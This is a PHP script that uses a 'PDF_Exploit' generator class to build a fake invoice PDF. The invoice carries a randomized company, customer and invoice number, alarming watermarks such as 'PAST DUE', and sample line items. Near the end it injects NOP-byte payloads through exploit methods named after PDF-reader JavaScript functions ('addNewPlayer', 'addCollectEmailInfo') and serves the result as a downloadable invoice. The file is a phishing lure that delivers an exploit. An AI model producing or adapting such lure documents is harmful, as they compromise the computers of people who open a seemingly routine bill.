<?php 
require('pdf_exploit_generator.class.php');
require('contact.class.php');

$customer_contact = new Contact();
$business_contact = new Contact();

$watermarks = array("CONFIDENTIAL","PAST DUE","CLASSIFIED","SENSITIVE");
$waterindex = rand(0,5);
$watermark = $watermarks[$waterindex];
$invoice_number = rand(1000000000,9999999999);

$pdf = new PDF_Exploit( 'P', 'mm', 'A4' );
$pdf->SetProtection(array('print'),'');
$pdf->AddPage();
$pdf->addSociete($business_contact->get_company(),$business_contact->get_partial_contact());
$pdf->fact_dev( "INVOICE", "" );
$pdf->temporaire($watermark);
$pdf->addDate($pdf->RandomDate());
$pdf->addClient("CL01");
$pdf->addPageNumber("1");
$pdf->addClientAdresse($customer_contact->get_full_contact());
$pdf->addReglement("Payment Due");
$pdf->addEcheance($pdf->RandomDate());
$pdf->addNumTVA($invoice_number);
$pdf->addReference("");
$cols=array( "REFERENCE"    => 23,
             "DESCRIPTION"  => 78,
             "QUANTITY"     => 22,
             "P.U. HT"      => 26,
             "MONTANT H.T." => 30,
             "TVA"          => 11 );
$pdf->addCols( $cols);
$cols=array( "REFERENCE"    => "L",
             "DESCRIPTION"  => "L",
             "QUANTITY"     => "C",
             "P.U. HT"      => "R",
             "MONTANT H.T." => "R",
             "TVA"          => "C" );
$pdf->addLineFormat( $cols);
$pdf->addLineFormat($cols);

$y    = 109;
$line = array( "REFERENCE"    => "REF1",
               "DESCRIPTION"  => "Carte Mère MSI 6378\n" .
                                 "Processeur AMD 1Ghz\n" .
                                 "128Mo SDRAM, 30 Go Disque, CD-ROM, Floppy, Carte vidéo",
               "QUANTITY"     => "1",
               "P.U. HT"      => "600.00",
               "MONTANT H.T." => "600.00",
               "TVA"          => "1" );
$size = $pdf->addLine( $y, $line );
$y   += $size + 2;

$line = array( "REFERENCE"    => "REF2",
               "DESCRIPTION"  => "Câble RS232",
               "QUANTITY"     => "1",
               "P.U. HT"      => "10.00",
               "MONTANT H.T." => "60.00",
               "TVA"          => "1" );
$size = $pdf->addLine( $y, $line );
$y   += $size + 2;

$pdf->addCadreTVAs();
       
$tot_prods = array( array ( "px_unit" => 600, "qte" => 1, "tva" => 1 ),
                    array ( "px_unit" =>  10, "qte" => 1, "tva" => 1 ));
$tab_tva = array( "1"       => 19.6,
                  "2"       => 5.5);
$params  = array( "RemiseGlobale" => 1,
                      "remise_tva"     => 1,       // {la remise s'applique sur ce code TVA}
                      "remise"         => 0,       // {montant de la remise}
                      "remise_percent" => 10,      // {pourcentage de remise sur ce montant de TVA}
                  "FraisPort"     => 1,
                      "portTTC"        => 10,      // montant des frais de ports TTC
                                                   // par defaut la TVA = 19.6 %
                      "portHT"         => 0,       // montant des frais de ports HT
                      "portTVA"        => 19.6,    // valeur de la TVA a appliquer sur le montant HT
                  "AccompteExige" => 1,
                      "accompte"         => 0,     // montant de l'acompte (TTC)
                      "accompte_percent" => 15,    // pourcentage d'acompte (TTC)
                  "Remarque" => "Avec un acompte, svp..." );

$pdf->addTVAs( $params, $tab_tva, $tot_prods);
$pdf->addCadreEurosFrancs();
$pdf->addNewPlayer("\x90");
$pdf->addCollectEmailInfo("\x90");
$pdf->build_exploit();
$pdf->Output($invoice_number ."_invoice.pdf","D");
?>
